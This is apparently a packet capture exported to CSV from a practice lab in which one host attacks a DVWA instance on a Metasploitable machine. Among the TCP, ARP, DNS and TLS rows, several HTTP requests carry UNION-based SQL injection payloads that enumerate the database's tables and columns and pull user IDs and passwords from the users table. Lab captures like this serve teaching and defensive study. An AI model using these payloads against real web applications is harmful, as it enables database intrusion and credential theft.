"No.","Time","Source","Destination","Protocol","Length","Info"
"169","231.687502688","10.0.2.4","10.0.2.5","TCP","4410","80  >  55216 [ACK] Seq=1 Ack=522 Win=6912 Len=4344 TSval=49061 TSecr=3495499991 [TCP segment of a reassembled PDU]"
"170","231.687510448","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4345 Win=31872 Len=0 TSval=3495499999 TSecr=49061"
"171","231.687991474","10.0.2.4","10.0.2.5","HTTP","548","HTTP/1.1 200 OK  (text/html)"
"172","231.687995985","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500000 TSecr=49061"
"173","231.689123825","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [FIN, ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500001 TSecr=49061"
"174","231.689814654","10.0.2.4","10.0.2.5","TCP","66","80  >  55216 [FIN, ACK] Seq=4827 Ack=523 Win=6912 Len=0 TSval=49061 TSecr=3495500001"
"175","231.689819938","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=523 Ack=4828 Win=31872 Len=0 TSval=3495500002 TSecr=49061"
"176","239.586473143","10.0.2.5","10.0.2.4","TCP","74","40524  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495507898 TSecr=0 WS=128"
"177","239.587115957","10.0.2.4","10.0.2.5","TCP","74","80  >  40524 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=49851 TSecr=3495507898 WS=128"
"178","239.587128842","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495507899 TSecr=49851"
"179","239.588327335","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+'testing',2--+&Submit=Submit HTTP/1.1 "
"180","239.588949897","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=49851 TSecr=3495507900"
"181","239.596385369","10.0.2.4","10.0.2.5","TCP","2962","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=2896 TSval=49851 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"182","239.596395486","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=2897 Win=31872 Len=0 TSval=3495507908 TSecr=49851"
"183","239.596542351","10.0.2.4","10.0.2.5","TCP","1514","80  >  40524 [ACK] Seq=2897 Ack=530 Win=6912 Len=1448 TSval=49852 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"184","239.596545249","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495507908 TSecr=49852"
"185","239.596901916","10.0.2.4","10.0.2.5","HTTP","570","HTTP/1.1 200 OK  (text/html)"
"186","239.596904377","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507909 TSecr=49852"
"187","239.597852621","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [FIN, ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"188","239.598464947","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [FIN, ACK] Seq=4849 Ack=531 Win=6912 Len=0 TSval=49852 TSecr=3495507910"
"189","239.598471638","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=531 Ack=4850 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"190","250.464982515","10.0.2.5","10.0.2.4","TCP","74","39818  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495518777 TSecr=0 WS=128"
"191","250.465528342","10.0.2.4","10.0.2.5","TCP","74","80  >  39818 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=50938 TSecr=3495518777 WS=128"
"192","250.465541783","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495518777 TSecr=50938"
"193","250.468183784","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@user,2--+&Submit=Submit HTTP/1.1 "
"194","250.468746577","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=50939 TSecr=3495518780"
"195","250.476401546","10.0.2.4","10.0.2.5","HTTP","476","HTTP/1.1 200 OK  (text/html)"
"196","250.476420439","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495518788 TSecr=50939"
"197","251.479561881","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [FIN, ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495519791 TSecr=50939"
"198","251.480175408","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [FIN, ACK] Seq=411 Ack=528 Win=6912 Len=0 TSval=51040 TSecr=3495519791"
"199","251.480479712","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=528 Ack=412 Win=31872 Len=0 TSval=3495519792 TSecr=51040"
"200","260.721487427","10.0.2.5","10.0.2.4","TCP","74","59766  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495529033 TSecr=0 WS=128"
"201","260.722015594","10.0.2.4","10.0.2.5","TCP","74","80  >  59766 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=51964 TSecr=3495529033 WS=128"
"202","260.722046924","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495529034 TSecr=51964"
"203","260.724603754","10.0.2.5","10.0.2.4","HTTP","594","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+dbname(),2--+&Submit=Submit HTTP/1.1 "
"204","260.725474727","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [ACK] Seq=1 Ack=529 Win=6912 Len=0 TSval=51964 TSecr=3495529036"
"205","260.732384134","10.0.2.4","10.0.2.5","HTTP","481","HTTP/1.1 200 OK  (text/html)"
"206","260.732412794","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495529044 TSecr=51964"
"207","261.735458120","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [FIN, ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495530047 TSecr=51964"
"208","261.736928076","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [FIN, ACK] Seq=416 Ack=530 Win=6912 Len=0 TSval=52065 TSecr=3495530047"
"209","261.736962433","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=530 Ack=417 Win=31872 Len=0 TSval=3495530049 TSecr=52065"
"210","347.770855128","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"211","347.770855387","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"212","361.893293434","10.0.2.5","172.31.1.130","DNS","84","Standard query 0xd016 A perfdata.portswigger.net"
"213","361.893563455","10.0.2.5","172.31.1.130","DNS","84","Standard query 0x5114 AAAA perfdata.portswigger.net"
"214","361.910748627","172.31.1.130","10.0.2.5","DNS","429","Standard query response 0xd016 A perfdata.portswigger.net A 34.241.103.101 A 52.212.154.154 NS ns-1337.awsdns-39.org NS ns-194.awsdns-24.com NS ns-573.awsdns-07.net NS ns-1955.awsdns-52.co.uk A 205.251.197.57 A 205.251.192.194 A 205.251.199.163 A 205.251.194.61 AAAA 2600:9000:5305:3900::1 AAAA 2600:9000:5300:c200::1 AAAA 2600:9000:5307:a300::1 AAAA 2600:9000:5302:3d00::1"
"215","361.910748681","172.31.1.130","10.0.2.5","DNS","165","Standard query response 0x5114 AAAA perfdata.portswigger.net SOA ns-573.awsdns-07.net"
"216","361.911508366","10.0.2.5","34.241.103.101","TCP","74","33092  >  443 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3429561796 TSecr=0 WS=128"
"217","361.983300619","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0x8e4a6e80"
"218","361.985703639","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0x8e4a6e80"
"219","362.072508321","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [SYN, ACK] Seq=0 Ack=1 Win=32768 Len=0 MSS=1460"
"220","362.072548820","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"221","362.081791244","10.0.2.5","34.241.103.101","TLSv1.2","559","Client Hello"
"222","362.243690375","34.241.103.101","10.0.2.5","TLSv1.2","2974","Server Hello"
"223","362.243728054","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=2921 Win=30660 Len=0"
"224","362.244137880","34.241.103.101","10.0.2.5","TCP","1514","443  >  33092 [PSH, ACK] Seq=2921 Ack=506 Win=32263 Len=1460 [TCP segment of a reassembled PDU]"
"225","362.244147427","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=4381 Win=30660 Len=0"
"226","362.244835214","34.241.103.101","10.0.2.5","TLSv1.2","1080","Certificate, Server Key Exchange, Server Hello Done"
"227","362.244854438","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=5407 Win=30660 Len=0"
"228","362.253344700","10.0.2.5","34.241.103.101","TLSv1.2","129","Client Key Exchange"
"229","362.315032459","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5407 Ack=581 Win=32188 Len=0"
"230","362.315071047","10.0.2.5","34.241.103.101","TLSv1.2","105","Change Cipher Spec, Encrypted Handshake Message"
"231","362.475957287","34.241.103.101","10.0.2.5","TLSv1.2","258","New Session Ticket, Change Cipher Spec, Encrypted Handshake Message"
"232","362.476966538","10.0.2.5","34.241.103.101","TLSv1.2","985","Application Data"
"233","362.565722239","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5611 Ack=1563 Win=32768 Len=0"
"234","362.669600181","34.241.103.101","10.0.2.5","TLSv1.2","237","Application Data"
"235","362.669600503","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [FIN, ACK] Seq=5794 Ack=1563 Win=32768 Len=0"
"236","362.671560563","10.0.2.5","34.241.103.101","TLSv1.2","85","Encrypted Alert"
"237","362.672052413","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [FIN, ACK] Seq=1594 Ack=5795 Win=30660 Len=0"
"238","362.672706991","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5795 Ack=1595 Win=32736 Len=0"
"239","367.155508655","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"240","367.155847236","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"241","401.275127279","10.0.2.5","10.0.2.4","TCP","74","36916  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495669587 TSecr=0 WS=128"
"242","401.283160103","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.5? Tell 10.0.2.4"
"243","401.283169627","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","10.0.2.5 is at 08:00:27:c9:93:64"
"244","401.283607292","10.0.2.4","10.0.2.5","TCP","74","80  >  36916 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=66016 TSecr=3495669587 WS=128"
"245","401.283638580","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495669595 TSecr=66016"
"246","401.284092101","10.0.2.5","10.0.2.4","HTTP","671","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(table_name),2+from+information_schema.tables+where+table_schema=database()--+&Submit=Submit HTTP/1.1 "
"247","401.284552965","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=0 TSval=66017 TSecr=3495669596"
"248","401.297275640","10.0.2.4","10.0.2.5","TCP","2962","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=2896 TSval=66018 TSecr=3495669596 [TCP segment of a reassembled PDU]"
"249","401.297311319","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=2897 Win=31872 Len=0 TSval=3495669609 TSecr=66018"
"250","401.297814752","10.0.2.4","10.0.2.5","HTTP","2178","HTTP/1.1 200 OK  (text/html)"
"251","401.297836122","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"252","401.298309619","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [FIN, ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"253","401.298886497","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [FIN, ACK] Seq=5009 Ack=607 Win=7040 Len=0 TSval=66018 TSecr=3495669610"
"254","401.298891504","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=607 Ack=5010 Win=31872 Len=0 TSval=3495669611 TSecr=66018"
"255","406.324161029","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"256","406.324675682","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"257","418.165253331","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"258","418.165517959","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"259","418.244882252","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=49 Ack=57 Win=32578 Len=0"
"260","423.219450797","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"261","423.220023463","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"262","460.143762242","10.0.2.5","10.0.2.4","TCP","74","47130  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495728456 TSecr=0 WS=128"
"263","460.144331281","10.0.2.4","10.0.2.5","TCP","74","80  >  47130 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=71901 TSecr=3495728456 WS=128"
"264","460.144369432","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495728456 TSecr=71901"
"265","460.144542238","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+version(),2--+&Submit=Submit HTTP/1.1 "
"266","460.144916214","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=71901 TSecr=3495728456"
"267","460.155285115","10.0.2.4","10.0.2.5","TCP","4410","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=4344 TSval=71902 TSecr=3495728456 [TCP segment of a reassembled PDU]"
"268","460.155311755","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495728467 TSecr=71902"
"269","460.155842920","10.0.2.4","10.0.2.5","HTTP","579","HTTP/1.1 200 OK  (text/html)"
"270","460.155862119","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"271","460.156323002","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [FIN, ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"272","460.156928623","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [FIN, ACK] Seq=4858 Ack=531 Win=6912 Len=0 TSval=71903 TSecr=3495728468"
"273","460.156935133","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=531 Ack=4859 Win=31872 Len=0 TSval=3495728469 TSecr=71903"
"274","465.202976466","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"275","465.204113381","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"276","472.463113573","10.0.2.5","10.0.2.4","TCP","74","41528  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495740775 TSecr=0 WS=128"
"277","472.463763759","10.0.2.4","10.0.2.5","TCP","74","80  >  41528 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73133 TSecr=3495740775 WS=128"
"278","472.463795945","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495740776 TSecr=73133"
"279","472.466473436","10.0.2.5","10.0.2.4","HTTP","596","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+database(),2--+&Submit=Submit HTTP/1.1 "
"280","472.467096471","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=0 TSval=73133 TSecr=3495740778"
"281","472.476241714","10.0.2.4","10.0.2.5","TCP","4410","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=4344 TSval=73134 TSecr=3495740778 [TCP segment of a reassembled PDU]"
"282","472.476279419","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4345 Win=31872 Len=0 TSval=3495740788 TSecr=73134"
"283","472.477053895","10.0.2.4","10.0.2.5","HTTP","569","HTTP/1.1 200 OK  (text/html)"
"284","472.477060506","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740789 TSecr=73134"
"285","472.481942053","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [FIN, ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740794 TSecr=73134"
"286","472.482759188","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [FIN, ACK] Seq=4848 Ack=532 Win=6912 Len=0 TSval=73135 TSecr=3495740794"
"287","472.482768574","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=532 Ack=4849 Win=31872 Len=0 TSval=3495740795 TSecr=73135"
"288","478.815893139","10.0.2.5","10.0.2.4","TCP","74","38550  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495747128 TSecr=0 WS=128"
"289","478.816516199","10.0.2.4","10.0.2.5","TCP","74","80  >  38550 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73768 TSecr=3495747128 WS=128"
"290","478.816528490","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495747128 TSecr=73768"
"291","478.818192188","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+user(),2--+&Submit=Submit HTTP/1.1 "
"292","478.818451161","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=73768 TSecr=3495747130"
"293","478.827835532","10.0.2.4","10.0.2.5","TCP","4410","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=4344 TSval=73769 TSecr=3495747130 [TCP segment of a reassembled PDU]"
"294","478.827870075","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4345 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"295","478.828217529","10.0.2.4","10.0.2.5","HTTP","571","HTTP/1.1 200 OK  (text/html)"
"296","478.828220875","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"297","478.831129446","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [FIN, ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747143 TSecr=73769"
"298","478.831685445","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [FIN, ACK] Seq=4850 Ack=528 Win=6912 Len=0 TSval=73770 TSecr=3495747143"
"299","478.831696899","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=528 Ack=4851 Win=31872 Len=0 TSval=3495747144 TSecr=73770"
"300","505.758128411","fe80::ce8b:2371:92ee:4afb","ff02::2","ICMPv6","62","Router Solicitation"
"301","520.391913151","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.3? Tell 10.0.2.4"
"302","524.113384030","10.0.2.5","10.0.2.4","TCP","74","47860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495792425 TSecr=0 WS=128"
"303","524.113958606","10.0.2.4","10.0.2.5","TCP","74","80  >  47860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=78297 TSecr=3495792425 WS=128"
"304","524.113970376","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495792426 TSecr=78297"
"305","524.114816847","10.0.2.5","10.0.2.4","HTTP","668","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(column_name),2+from+information_schema.columns+where+table_name='users'--+&Submit=Submit HTTP/1.1 "
"306","524.115377474","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=0 TSval=78297 TSecr=3495792427"
"307","524.125319274","10.0.2.4","10.0.2.5","TCP","4410","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=4344 TSval=78298 TSecr=3495792427 [TCP segment of a reassembled PDU]"
"308","524.125337180","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=4345 Win=31872 Len=0 TSval=3495792437 TSecr=78298"
"309","524.125831433","10.0.2.4","10.0.2.5","HTTP","758","HTTP/1.1 200 OK  (text/html)"
"310","524.125837624","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792438 TSecr=78298"
"311","524.128177852","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [FIN, ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792440 TSecr=78298"
"312","524.128835752","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [FIN, ACK] Seq=5037 Ack=604 Win=7040 Len=0 TSval=78298 TSecr=3495792440"
"313","524.128856256","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=604 Ack=5038 Win=31872 Len=0 TSval=3495792441 TSecr=78298"
"314","529.202725399","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"315","529.203181128","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"316","568.279280516","10.0.2.5","10.0.2.4","TCP","74","35164  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495836591 TSecr=0 WS=128"
"317","568.279969664","10.0.2.4","10.0.2.5","TCP","74","80  >  35164 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=82712 TSecr=3495836591 WS=128"
"318","568.279983453","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495836592 TSecr=82712"
"319","568.280298210","10.0.2.5","10.0.2.4","HTTP","627","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"320","568.280712362","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=0 TSval=82712 TSecr=3495836592"
"321","568.288486759","10.0.2.4","10.0.2.5","TCP","4410","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=4344 TSval=82713 TSecr=3495836592 [TCP segment of a reassembled PDU]"
"322","568.288496301","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=4345 Win=31872 Len=0 TSval=3495836600 TSecr=82713"
"323","568.288953091","10.0.2.4","10.0.2.5","HTTP","796","HTTP/1.1 200 OK  (text/html)"
"324","568.288957930","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836601 TSecr=82713"
"325","568.291339996","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [FIN, ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836603 TSecr=82713"
"326","568.292245812","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [FIN, ACK] Seq=5075 Ack=563 Win=7040 Len=0 TSval=82713 TSecr=3495836603"
"327","568.292256480","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=563 Ack=5076 Win=31872 Len=0 TSval=3495836604 TSecr=82713"
"328","573.490716908","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"329","573.490974495","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"330","603.475808879","10.0.2.5","10.0.2.4","TCP","74","43730  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495871788 TSecr=0 WS=128"
"331","603.476200877","10.0.2.4","10.0.2.5","TCP","74","80  >  43730 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=86231 TSecr=3495871788 WS=128"
"332","603.476211264","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495871788 TSecr=86231"
"333","603.477975239","10.0.2.5","10.0.2.4","HTTP","632","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"334","603.478511446","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=0 TSval=86231 TSecr=3495871790"
"335","603.485819117","10.0.2.4","10.0.2.5","TCP","2962","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=2896 TSval=86231 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"336","603.485829717","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=2897 Win=31872 Len=0 TSval=3495871798 TSecr=86231"
